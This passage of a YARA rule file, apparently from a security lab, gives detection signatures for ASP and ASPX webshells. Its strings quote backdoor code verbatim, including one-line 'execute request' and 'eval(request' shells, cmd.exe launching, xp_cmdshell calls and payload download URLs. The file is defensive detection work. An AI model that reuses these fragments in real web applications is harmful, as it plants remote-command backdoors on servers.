        $s12 = "response.write \" <font color=green><b>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule sig_103f227a2c2eff2e71ef340c17648eef8d86ac0f
{
     meta:
        description = "asp - file 103f227a2c2eff2e71ef340c17648eef8d86ac0f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1b7451ed70e836b4ab317f11617df013fcf05e8122eff8690537a0cb639003fa"
     strings:
        $s1 = "Response.Write \"<input type=text name=systempath width=32 size=50>\" " fullword ascii
        $s2 = "Set objCountFile=objFSO.CreateTextFile(request(\"systempath\"),True) " fullword ascii
        $s3 = "Response.write server.mappath(Request.ServerVariables(\"SCRIPT_NAME\")) " fullword ascii
        $s4 = "if Trim(request(\"systempath\"))<>\"\" then " fullword ascii
        $s5 = "Response.write \"<form action='' method=post>\" " fullword ascii
        $s6 = "Response.write \"<textarea name=sAvedata cols=80 rows=10 width=32></textarea>\" " fullword ascii
        $s7 = "D:\\web\\x.asp):</font>\" " fullword ascii
        $s8 = "Set objFSO = Server.CreateObject(\"Scripting.FileSystemObject\") " fullword ascii
        $s9 = "Response.write \"<input type=submit value=" fullword ascii
        $s10 = "response.write \"<font color=red>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule sig_8e4edf5e973a879836d78475318a9fa5e9cca970
{
     meta:
        description = "asp - file 8e4edf5e973a879836d78475318a9fa5e9cca970.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6a2aacfcb17039314924fc9d8ecfd08d87c5869481c8fe064adf3d67bae07c68"
     strings:
        $s1 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s2 = "<-- CmdAsp.asp -->" fullword ascii
        $s3 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
        $s4 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
        $s5 = "<++ CmdAsp.asp ++>" fullword ascii
        $s6 = "<input type=submit value=\"Run\">" fullword ascii
     condition:
        ( uint16(0) == 0x2b3c and filesize < 4KB and ( all of them ) ) or ( all of them )
}

rule sig_0959d5c4595891b27fe68e564871657e81a857db
{
     meta:
        description = "asp - file 0959d5c4595891b27fe68e564871657e81a857db.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "edbaeda7f6a7fca7fcd27ccec731287656f55775d94f35688ee4ee7773415ecb"
     strings:
        $s1 = "<mEtA nAmE='AUthOR' cOntEnt='uploadvirus(At)Gmail.cOm' />" fullword ascii
        $s2 = "<bgsound src=\"http://www.4ewz.com/mymusic191/wma/music/190.mp3\" loop=\"-1\">" fullword ascii
        $s3 = "<mEtA nAmE='cOpYRight' cOntEnt='http://bbs.16kc.net/?fromuid=1856' />" fullword ascii
        $s4 = "<mEtA http-EqUiv='cOntEnt-tYpE' cOntEnt='tExt/htmL; chARSEt=gB2312' />" fullword ascii
        $s5 = "<v:ROUndREct StYLE='tExt-ALign:LEFt; diSpLAY:tABLE; mARgin:AUtO; pAdding:15px; width:750px; hEight:510px; OvERFLOw:hiddEn; pO" fullword ascii
        $s6 = "<v:ROUndREct StYLE='tExt-ALign:LEFt; diSpLAY:tABLE; OvERFLOw:hiddEn; ' ARcSizE='3200F' cOORdSizE='21600,21600' FiLLcOLOR='#Fd" fullword ascii
        $s7 = "<tABLE width='100%' cELLpAdding='0' cELLSpAcing='0' BORdER='0' StYLE='pAdding-BOttOm:6px; BORdER-BOttOm:1px #E3E3E3 SOLid" fullword ascii
        $s8 = "<tABLE width='100%' cELLpAdding='0' cELLSpAcing='0' BORdER='0' StYLE='pAdding-BOttOm:6px; BORdER-BOttOm:1px #E3E3E3 SOLid'>" fullword ascii
        $s9 = "SitiOn:RELAtivE;' ARcSizE='3200F' cOORdSizE='21600,21600' FiLLcOLOR='#FdFdFd' StROkEcOLOR='#E6E6E6' StROkEwEight='1px'>" fullword ascii
        $s10 = "<td width='80' vALign='tOp' StYLE='pAdding-tOp:13px'><SpAn StYLE='FOnt-SizE:16px; zOOm:4; cOLOR:#AAAAAA'><FOnt FA" fullword ascii
        $s11 = "<td>         <% dim OBjFSO %>         <% dim FdAtA %>         <% dim OBjcOUntFiLE %>         <% On ERROR RESUmE nExt %> " fullword ascii
        $s12 = "....&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"http://bbs.16kc.net/?fromuid=1856\">" fullword ascii
        $s13 = "<mEtA nAmE='gEnERAtOR' cOntEnt='EditpLUS2.11' />" fullword ascii
        $s14 = "<!-- nO jUmp -->" fullword ascii
        $s15 = "16KC.net</a></B></td>" fullword ascii
        $s16 = "<% OBjcOUntFiLE.wRitE FdAtA %>         <% iF ERR =0 thEn %>         <% RESpOnSE.wRitE \"<FOnt cOLOR=REd>" fullword ascii
        $s17 = "<mEtA nAmE='USEFOR' cOntEnt='AppLicAtiOn tERminAtiOn' />" fullword ascii
        $s18 = "<div StYLE='mARgin:AUtO; width:450px; tExt-ALign:cEntER'>" fullword ascii
        $s19 = "<BOdY StYLE='tExt-ALign:cEntER;mARgin:90px 20px 50px 20px'>" fullword ascii
        $s20 = "FOnt-FAmiLY: tAhOmA, ARiAL, 'cOURiER nEw', vERdAnA, SAnS-SERiF;" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule f41f8c82b155c3110fc1325e82b9ee92b741028b
{
     meta:
        description = "asp - file f41f8c82b155c3110fc1325e82b9ee92b741028b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "52a45d5e40908a56faa6898c6858f2f84a86142df562525b6af9232c5707b351"
     strings:
        $s1 = "axJ1WsFkmGhyu^Wsfu1Wh*-mWhX-mG:+k1WhFu1W:Ru1G:OuswDFksaY -swD&u^2Oc-VaYXus2DvkVaOG-V2ORuV2OOJ@#@&MU9wnX'kwVbYv2+X~Eur#c." fullword ascii
        $s2 = "x@#@&K8RKWkkOrKxP{~f&2x9~lP:FcZGwzPKPP B9?Dl.O fq3U9Of@#@&PyRKK/bYkKx,xPZPlP:  PHw+,xPy@#@&:+ Z4lM/nY~xro8 2q r@#@&jw.Px~:  I" fullword ascii
        $s3 = "NbD+1Y,;D^@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!4@*@![r7PCVbLx{mnUD+D@*@!6WUY,dbyn{BlBP1W^GD{B.+9B@*Km//qGD9P2M.GDe@!J0GxO~r[;/" fullword ascii
        $s4 = "PxPERG2J2:3f}H)(gJP'~74/DdW,[~rO&n'ZRZ !c!EPLP-8;DS6~[,JPhG.YgW{J~[~WDw2WMOPLP-8;DSW@#@&:OP{~r?(:2,Hb&1:31z1/2rP'~74ZMJ0@#@&x" fullword ascii
        $s5 = "Esl-~EYr:(;?E'nhmxPvOb:8Ekv{+2HY,YEaxb@!@*9'[k,B+v{xladVKmP9O@!@*E+^N[khv{xLk^C\\,B.nDx+^v{xLk^C,DO@!@*MYz@!@*9Oz@!" fullword ascii
        $s6 = "6OGbxYn.vZjYMc_+avnKDYzDMCXvFb#*[/jDD`_n6vnWMO)DMlH`T#bb*@#@&2^d+,@#@&%r2D.GM\"~ZmUEY~\"+mN\"r@#@&3x9P(0@#@&3U9Ps!UmDkW" fullword ascii
        $s7 = "@!zm@*~J@#@&dr{/kLE@!mPtMnW'ELm\\C/^.bwO)w;V^sG.s`JEELInnmO4`KmY4[J'JLJRglh+*[EEr~Jr3NbYsbsnJr#EP^VCdk'vlsvPDkOs" fullword ascii
        $s8 = "=\"http://lpl38.com/web/FileType/\"'" fullword ascii
        $s9 = "=\"http://lpl38.com/web/pr.exe\"'" fullword ascii
        $s10 = "=\"http://lpl38.com/web/php.txt\"'" fullword ascii
        $s11 = "=\"http://lpl38.com/web/aspx.txt\"'" fullword ascii
        $s12 = "EL+W@#@&%P1Na'r@!l~4M+W'E%m\\CkmMkwD)w;V^sGDs`EE'--' -'J[\"nKlDtv?n/drKxcJwGV9+.KmYtEbLJE#LE'x;^Jr~Jr1" fullword ascii
        $s13 = "=\"http://lpl38.com/web/\"'" fullword ascii
        $s14 = "+~Y4nx@#@&OaDRmsGk+@#@&6dK( V+Dsk^+vok^+iD^# )DYDb8ED+/{f+@#@&k6P)w2sbmCYbGxvDn5!+/Ocrn.Wwr^+E*[rZtmDrb'8POt" fullword ascii
        $s15 = "bW~`9W1Eh+UOconYAs+s+UO~Xq[ck# /Dz^+ 9kkwVmX{xJrJE#PNG^!:+" fullword ascii
        $s16 = "@!J4@*@!Jl@*@!JKf@*@!K\"Pm^Cd/{K~K9@*~@!wr]H,CmDkGU{P:nO4W['hGkY@*r@#@&LJ@!KG~l^kLx{:r[9V+@*@!A@*" fullword ascii
        $s17 = "'&b:mo+kzcC/a[Wk^+UCs+FEI@!J/mMr2Y@*J@#@&nx[~kE8@#@&@#@&UE8~t+/dCT+c/DCD+Ss/T~0^lTb@#@&LE@!:b$JAPhb[Y4'cRT~4KD9+.'T~mVro" fullword ascii
        $s18 = "~[,!Tq,zPbTZF~e,b*c+ZF,ePW Zq`,z~+.kjn4Y`vakwP',n\"kU+4KO+Ll,xnt:~#W Tq,eP*+ZF~e,*y!qvP@!P+.kUntDP[xzPb*y!F,MPW !8c~'@*P" fullword ascii
        $s19 = "@!&:f@*@!&K\"@*J@#@&~PwWMP3l^4,f.k7nA,kU~w?r 9Mk-+k@#@&LE,@!:IPmVbLx{:rN9Vn~1Vlkd':AKG@*@!s}ItPCmOrKxxgz^YbWUxUmlU9Mk-+L9Mk-" fullword ascii
        $s20 = "xqJ,[,\\8Z.J6P'PrRImYrGkZDn[bYx!r~LP-(ZMS0,[,EO5EGYmZ;.M+xDx!rP[,-8ZMS6P'PER5EGYm\\lXkh;s'!E~LP-4;.d0~LP|@#@&,P,~P,P~J HCr" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_26aae6e99670c2ffd45b4e4a1161c72f1bb1623b
{
     meta:
        description = "asp - file 26aae6e99670c2ffd45b4e4a1161c72f1bb1623b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f4773f7394c8e15ed9b03b9abbfc8c8f5295a90389fc96522806e7452c4447d9"
     strings:
        $x1 = "{var a=new ActiveXObject('wscript.shell'); var exec=a.Exec(x);return exec.StdOut.ReadAll()+exec.StdErr.ReadAll(); }</msxsl:scri" fullword ascii
        $s2 = "xlst=\"<?xml version='1.0'?><xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msx" ascii
        $s3 = "xml=\"<?xml version=\"\"1.0\"\"?><root >cmd /c dir</root>\"" fullword ascii
        $s4 = "pt><xsl:template match=\"\"/root\"\"> <xsl:value-of select=\"\"zcg:xml(string(.))\"\"/></xsl:template></xsl:stylesheet>\"" fullword ascii
        $s5 = "response.write \"<pre><xmp>\" & xmldoc.TransformNode(xsldoc)& \"</xmp></pre>\"" fullword ascii
        $s6 = "Set xsldoc = Server.CreateObject(\"MSXML2.DOMDocument\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_88d8b5758be080220f8a530c8fa79845fca68822
{
     meta:
        description = "asp - file 88d8b5758be080220f8a530c8fa79845fca68822.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d4e2230991106a793376037e910e657d810a4679ab08fbad3eb9b6089a6365c0"
     strings:
        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $x2 = "<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->" fullword ascii
        $s3 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s4 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s5 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s6 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s7 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s8 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
        $s9 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
        $s10 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
        $s11 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
        $s12 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
        $s13 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
        $s14 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
        $s15 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
        $s16 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
        $s17 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
        $s18 = "<FORM method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" >" fullword ascii
        $s19 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
        $s20 = "<td bgcolor=\"#000000\" valign=\"bottom\"><font face=\"Arial\" size=\"-2\" color=gray>NOTE FOR UPLOAD -" fullword ascii
     condition:
        ( uint16(0) == 0x2023 and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule da38c65ec34882a24f47e9ccc55a9f2222ea7a81
{
     meta:
        description = "asp - file da38c65ec34882a24f47e9ccc55a9f2222ea7a81.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "058aef0ea68af9c679f7f574194bd0e13ca6351d77b5706e20ed62c4d5b90380"
     strings:
        $s1 = "YPm[GZmYmVGo~x,?nD7nDcZ.nmY+68N+^YvEzf6oR;lYmVKLJ*@#@&mKxUjDDP{~JhDW7r[+M'tk^DGdK0ORxnYcrJ3GAR* Zi~fmOmPjKEMm+{J,'PU+.\\" fullword ascii
        $s2 = "1,'Pk+\"#2MR^IAbP3}4LA/YvrA:cX~Z#*@#@&/nP,l9r1)YmV6L,'PdnM.nIc/\"+CD2}ALAmDcJzf6(cZCOmVWTE#@#@&ZKUH/DI,'~JK.K\\rN" fullword ascii
        $s3 = "@!zm@*@!JY[@*@!zO.@*PJ@#@&BN4J@!O.@*@!Y9P4+rL4YxBy+B@*@!C~4D+WxEtOYalJzAShc,%O%O0FcmG:Jw.&Q?E(hkD'_u$+]A,3]9FY)w_'NKhlbxxEL" fullword ascii
        $s4 = "hW(LnmDJb@#@&w+XxJ1W:8k^Ws -mG:fk1Whc-^Ws*k^K:vk^K:{u1Gs%k1Ws,u^wDqu^wO -V2O2uVaOc-VwDXkVaY+uswO{-V2YRkVaY1E@#@&DU[a+a'k2^kOvw" fullword ascii
        $s5 = "<title>UPS FE > CD > HtmlIframeView - Powered By Apollo</title>" fullword ascii
        $s6 = "cc#=/m/n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">" fullword ascii
        $s7 = "mYrb~P,@#@&?nY~~,0~P,xP,0dGcM+OobVn`Mn$EnkYvJ;$0bs+r#bP@#@&~r6P0cCYDDk(;O+k'ZPOtnU@#@&~P6 lDY.r(EYnd{F@#@&,~" fullword ascii
        $s8 = "bP@#@&q6~\\k9`kY.kUS,kSP8bP{PEWrPr.~tk[`kOMkUBPb~P8#,xJwJ~K4+U~@#@&L,xP8*P@#@&3x9P&0~@#@&(6P\\k9c/DDrUBPkS~8#~',E" fullword ascii
        $s9 = "kkY.lOGM/SoMGEaJb@#@&sW.~Al^t,C9:r" fullword ascii
        $s10 = "~PbS~F*P{PEfE~:tnx,@#@&NPx~8&P@#@&Ax[P&W,@#@&&0,Hk9`kODbxSPb~~q*P',EmrPrM~\\k9`kY.kUS,kSP8bP{PE/rPK4n" fullword ascii
        $s11 = "Y+M@*Ebir@#@&L(JdnDKksnW!Y`rE[W1Es+UY C^V H|jm4EhC1t+. kE8:bOv#IrJBc!Z!*IJ@#@&%4r@!&d1DkaO@*r@#@&1Cd+,&@#@&d+O~1'j+M-+MR/." fullword ascii
        $s12 = "~PrS,FbP{~r+E,rMPHbNvdYMkU~,kS~8#P{~JAJP:4nx,@#@&L~'~qWP@#@&AUN,qW~@#@&qW~tk[`kOMkUBPb~P8#,xPrNEP}D~\\bN`kODbx~,rSP8#,'~J9E,K4+" fullword ascii
        $s13 = "0xELm\\lkmMrwD)oE^Vj5^?YMcJrJ[k}J/:ILJEJSELk'J*v@*r[('r@!zC@*Lx8/aIr@#@&,P,PP,P,3xGPrs@#@&~~,PP,U+XY@#@&~~P,P,P~P~j&'jqLE[" fullword ascii
        $s14 = "P^K1g?KM@#@&(0,+.D,Yung@#@&bWPAIDcH;H(2MPxPR+8c{ 8{%W&~GMP+]]c1i:~nMPx,OyFcFc+{ l,~K4+U@#@&q0,(1UYDvn.DcNA//Dr2DqG1B~JvZGU" fullword ascii
        $s15 = "@*J@#@&N8J@!/OX^+~OHw+{EJD+6D&^/kJr@* /4GSVr/DONP4G.9+DR8KYOWsl[&f2PkWVbN,qwXiNJ@#@&%8r4W9z~DN" fullword ascii
        $s16 = "/cE`ISrb@#@&xksC%4s'M+5E3jDRd2M#+\".).&bAs3k`ES}/zSmzfGIJ*@#@&)m:qG1{In}`2?DcJzmYbGUJ*@#@&IGWP2zKu'UnI7+] sbn2C:CcJcE*@#@&q" fullword ascii
        $s17 = "6O@#@&L4~dDDG4N@#@&2sk+@#@&L(Pr3DMW.\",ZCUEYP\"nl9\"J@#@&3x9P&0@#@&%8,J@!4M@*@!(D@*E@#@&nG.Db.Dmz{" fullword ascii
        $s18 = "E@*@!J2@*@!J0KDh@*E@#@&xr:m%4sPx~M+;;nkY 0K.s`Ek+Mkwr#@#@&EkD~',Dn5!+/D 0KD:vE[Ek+MJb@#@&2SN~',.+$EndDR0G.s`ENaA9Jb@#@&aWDDP{~D" fullword ascii
        $s19 = "HNBK9)BY?Ob@#@&~P,~,PoUYmDK,',(1kK]`y SOb1~rUls+'rEE~8#3v@#@&~~,P~P631GPx~&1/O.vsjKz]:~Ob1BJJrJBq#@#@&~P,P~~!nxzh+,'Pd/C?" fullword ascii
        $s20 = "~)@!&4@*@!8.@*@!t.@*r#@#@&:haPx,?aSqD`M3p`+dYc0G]s`JaGDDJ#BESJ*@#@&q2Px~kwJkDcIAp;3UKRW6\"HcJb2r#Sr~r#@#@&0K.P_j~',!~O}PE(6E" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_48814a5926e8d8abab936dbad652090823b7eac1
{
     meta:
        description = "asp - file 48814a5926e8d8abab936dbad652090823b7eac1.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "51e9f4b0505075685eb5a15eaa22dfe4e2c2cd6b4beb8f500ffd4ebc602aab2d"
     strings:
        $s1 = "<%execute request(" fullword ascii
        $s2 = "[code]<script language=vbs runat=server>eval(request(" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule ringzer0
{
     meta:
        description = "asp - file ringzer0.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "010ba2b5527e4f76d2c91cdb7ea6dae839238e89210b6e28ada44dd1895e3c60"
     strings:
        $s1 = "_3fc3e7f1bff24b57.FileName = \"cmd.exe\";" fullword ascii
        $s2 = "_7f1ac1.PostedFile.ContentLength + \" kb<br>\" +" fullword ascii
        $s3 = "_3fc3e7f1bff24b57.UseShellExecute = false;" fullword ascii
        $s4 = "<form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii
        $s5 = "ProcessStartInfo _3fc3e7f1bff24b57 = new ProcessStartInfo();" fullword ascii
        $s6 = "<asp:Button id=\"testing\" runat=\"server\" Text=\"Run\" OnClick=\"_bb95b4213b36fd95_Click\"></asp:Button><br />" fullword ascii
        $s7 = "<asp:TextBox id=\"_0232b8c9c8a77279a1cc0d9bef47f0\" runat=\"server\" Width=\"250px\"></asp:TextBox><br />" fullword ascii
        $s8 = "Process _190019cabf9370c4eab9c5 = Process.Start(_3fc3e7f1bff24b57);" fullword ascii
        $s9 = "_7f1ac1.PostedFile.FileName + \"<br>\" +" fullword ascii
        $s10 = "<title>Mr.Un1k0d3r - RingZer0 Team</title>" fullword ascii
        $s11 = "_4e241b6c.Text = \"ERROR: \" + ex.Message.ToString();" fullword ascii
        $s12 = "<asp:TextBox id=\"_8dc4fb3fe3832425\" runat=\"server\" Width=\"250px\"></asp:TextBox>" fullword ascii
        $s13 = "_7f1ac1.PostedFile.ContentType;" fullword ascii
        $s14 = "void _5fa6d819eaa88f545f309b15b3dc5c_Click(object sender, System.EventArgs e) {" fullword ascii
        $s15 = "<div style=\"background-color: #ddd; padding: 5px; border-radius: 5px; margin-bottom: 15px;\">" fullword ascii
        $s16 = "string _3adb56841ac680b78d = _080765e145d229dc58ec9828b1.ReadToEnd();" fullword ascii
        $s17 = "void _bb95b4213b36fd95_Click(object sender, System.EventArgs e) {" fullword ascii
        $s18 = "_4e241b6c.Text = \"<pre>\" + _3adb56841ac680b78d + \"</pre>\";" fullword ascii
        $s19 = "<asp:FileUpload ID=\"_7f1ac1\" runat=\"server\" />" fullword ascii
        $s20 = "<asp:Label ID=\"_4e241b6c\" runat=\"server\">Output:</asp:Label>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule sig_09b59024ad8e7e075fdd06846ec011d00ddcedce
{
     meta:
        description = "asp - file 09b59024ad8e7e075fdd06846ec011d00ddcedce.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6e233d6346ab9a7544a0058316a0ad9934bc7d5a4f1ed5bca54a513da4850bf6"
     strings:
        $s1 = "<%'<% loop <%:%><%execute request(" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_7599d328cd5f651bf61da1151b4448063260054f
{
     meta:
        description = "asp - file 7599d328cd5f651bf61da1151b4448063260054f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "482d9fef978a30cdc482a6ef46d2e1c573e46226245b120c1c9ed6fc954c1bca"
     strings:
        $s1 = "o.run \"e\",Server,Response,Request,Application,Session,Error '" fullword ascii
        $s2 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_900c0331f0aa07e6e794a69bceac02a62ad69c95
{
     meta:
        description = "asp - file 900c0331f0aa07e6e794a69bceac02a62ad69c95.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "321a5060ace795c6d25a6186ad3bc144776e3625db65ef279b32c705ca2c686e"
     strings:
        $s1 = "<%Y=request(\"x\")%> <%execute(Y)%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule e335c8acdaeecde612b905de0f839c1b2d9c370e
{
     meta:
        description = "asp - file e335c8acdaeecde612b905de0f839c1b2d9c370e.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "542e36ea677e11f29aaf55491e6ebb10d21d9f7c0c4048661bf84ffc48840d70"
     strings:
        $s1 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword ascii
        $s2 = "execute (decode (codeds) )   " fullword ascii
        $s3 = "'response.write(decode(codeds)) " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1d9b78b5b14b821139541cc0deb4cbbd994ce157
{
     meta:
        description = "asp - file 1d9b78b5b14b821139541cc0deb4cbbd994ce157.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
     strings:
        $x1 = "frames.byZehir.document.execCommand('InsertImage', false, imagePath);" fullword ascii
        $x2 = "frames.byZehir.document.execCommand(command, false, option);" fullword ascii
        $s3 = "response.Write \"<br><br><font style='FONT-WEIGHT:normal' size=2>zehirhacker@hotmail.com<br><font color=yellow face='courier " fullword ascii
        $s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>\"" fullword ascii
        $s5 = "Response.Write \"<tr><td><b><font color=red>Log Root</td><td> \" & request.servervariables(\"APPL_MD_PATH\") & \"</td></tr>\"" fullword ascii
        $s6 = "Response.Write \"<form method=get action='\"&DosyPath&\"' target='_opener' id=form1 name=form1>\"" fullword ascii
        $s7 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Fil.name" fullword ascii
        $s8 = "objConn.Execute strSQL" fullword ascii
        $s9 = "Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)" fullword ascii
        $s10 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
        $s11 = "response.Write \"<iframe style='width:0; height:0' src='http://localhost/tuzla-ebelediye'></iframe>\"" fullword ascii
        $s12 = "Response.Write \"<tr><td><b><font color=red>HTTPD</td><td> \" & request.servervariables(\"SERVER_SOFTWARE\") & \"</td></tr>\"" fullword ascii
        $s13 = "Response.Write \"<tr><td><b><font color=red>Port</td><td> \" & request.servervariables(\"SERVER_PORT\") & \"</td></tr>\"" fullword ascii
        $s14 = "Call Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")" fullword ascii
        $s15 = "Response.Write \"<font face=wingdings size=5>4</font> <a href='\"&dosyaPath&\"?status=8&Path=\"&path&\"&table=\"&table.Nam" fullword ascii
        $s16 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)" fullword ascii
        $s17 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)" fullword ascii
        $s18 = "Response.Write \"<tr><td><b>\"&drive_.DriveLetter&\":\\</td><td><font color=red>yazma yetkisi yok! : [\"&err.Descript" fullword ascii
        $s19 = "Response.Write \"<tr><td><b><font color=red>HTTPS</td><td> \" & request.servervariables(\"HTTPS\") & \"</td></tr>\"" fullword ascii
        $s20 = "Response.Write \"<tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : [\"&err.Description&\"]</td></tr>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_569259aafe06ba3cef9e775ee6d142fed6edff5f
{
     meta:
        description = "asp - file 569259aafe06ba3cef9e775ee6d142fed6edff5f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fe51d328fad9a3925420fc0eb57f974c90918bc8fe4ca70e6e7eaefcb94cd96f"
     strings:
        $s1 = "ef=\"http://hi.baidu.com/ahhacker86\" target=\"_blank\">" fullword ascii
        $s2 = "master..xp_Cmdshell &quot;<% =Serverdos%>&gt;C:\\jk.txt&quot;'''''',N''Master'''" fullword ascii
        $s3 = "'-----------------           http://hi.baidu.com/ahhacker86 -----------------" fullword ascii
        $s4 = "Set Rs = Conn.exeCute (GetSql)" fullword ascii
        $s5 = "<form action=\"?action=Chklogin\" method=\"post\">" fullword ascii
        $s6 = "Conn.exeCute (Cmdshell)" fullword ascii
        $s7 = "'-----------------       E-mail: ly7666255@163.com  -----------------" fullword ascii
        $s8 = "<td height=\"30\" Colspan=\"3\"><div align=\"Center\" Class=\"STYLE2 STYLE1\">&nbsp;&nbsp;&nbsp;&nbsp; <span Class=\"STYLE3\">By" ascii
        $s9 = "<meta http-equiv=\"Content-Type\" Content=\"text/html; ChaRSet=gb2312\" />" fullword ascii
